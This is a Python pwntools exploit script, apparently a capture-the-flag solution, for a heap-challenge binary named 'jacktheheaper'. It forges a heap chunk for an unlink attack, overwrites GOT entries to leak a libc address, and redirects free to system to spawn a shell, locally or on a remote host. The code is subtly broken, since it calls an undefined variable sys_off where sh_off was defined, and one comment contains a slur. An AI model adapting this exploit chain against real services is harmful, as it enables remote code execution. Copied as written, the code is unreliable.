from pwn import *

tmp       = 0x6010a0
array     = 0x601120
fd        = array - (3*8)
bk        = array - (2*8)
free_got  = 0x601018
scanf_got = 0x601058
puts_plt  = 0x400636
scanf_off = 0x5dd10
sh_off    = 0x180503

def alloc():

	r.sendlineafter('> ', '1')
	return

def edit(idx, data):

	r.sendlineafter('> ', '4')
	r.sendlineafter('Write index: ', str(idx))
	
	if 0x90 > len(data):
		data += '\n'
	
	r.send(data)

	return

def free(idx):

	r.sendlineafter('> ', '2')
	r.sendlineafter('Index to free: ', str(idx))
	return

def wtmp(data):

	r.sendlineafter('> ', '3')
	r.sendline(data)
	return

def pwn():

	# Place bin/sh at the tmp area
	wtmp('sh\x00')

	alloc() # 0
	alloc() # 1
	alloc() # 2

	fake_chunk  = p64(0)
	fake_chunk += p64(0x8)
	fake_chunk += p64(fd)
	fake_chunk += p64(bk)
	fake_chunk += 'A'*0x60
	fake_chunk += p64(0x80)
	fake_chunk += p64(0x90)

	edit(0, fake_chunk)

	# Retarded buffering issue
	r.sendlineafter('Write index: ', '2')
	r.sendline('lel')

	# unlink
	free(1)

	# Overwrite the array's entries
	edit(0, p64(0)*3 + p64(free_got) + p64(scanf_got) + p64(tmp))
	# free => puts
	edit(0, p64(puts_plt))

	# Leak scanf
	free(1)
	
	scanf  = u64(r.recv(6).ljust(8, '\x00'))
	libc   = scanf - scanf_off
	system = libc  + sys_off

	log.success("scanf:  0x{:x}".format(scanf))
	log.success("Libc:   0x{:x}".format(libc))
	log.success("system: 0x{:x}".format(system))
	
	# free => system 
	edit(0, p64(system))
	
	free(2)

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./jacktheheaper')
        pause()
        pwn()
